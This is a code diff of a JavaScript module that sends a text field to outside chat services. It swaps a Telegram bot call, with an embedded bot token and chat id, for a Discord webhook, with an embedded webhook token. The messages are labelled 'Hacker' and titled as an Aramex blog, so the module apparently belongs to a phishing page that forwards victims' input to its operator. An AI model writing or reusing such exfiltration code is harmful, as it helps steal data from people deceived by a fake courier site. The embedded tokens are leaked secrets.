@@ -2,21 +2,21 @@ import axios from 'axios';
 
 
 const TeleSned = () => {
-
+     
     const Send = async (des) => {
-      /*  const body = {
+        const body = {
           content: "Hacker",
           tts: false,
           color: "white",
           embeds: [
             {
-              title: "مدونة ارامكس",
+              title: " مدونة اراميكس ",
               description: des,
            },
           ],
     };
-       */let txt= "مدونة ارامكس  %0A"+ des   
-        await         await axios.post(`https://api.telegram.org/bot8064760278:AAH7LlhaBS0pslMMwbtjI5ySSjOnq5EDs3M/sendMessage?chat_id=7404525102&text=${txt}`) 
+
+        await axios.post("https://discord.com/api/webhooks/1280208202859806854/kkoDvhqfrYJHfTtLaRK7XBXi3qSEIbpNf5srs14f34Fh5vKMMex5bClNeuDAMJVGYZMs",body) 
     }
   return {
     Send,
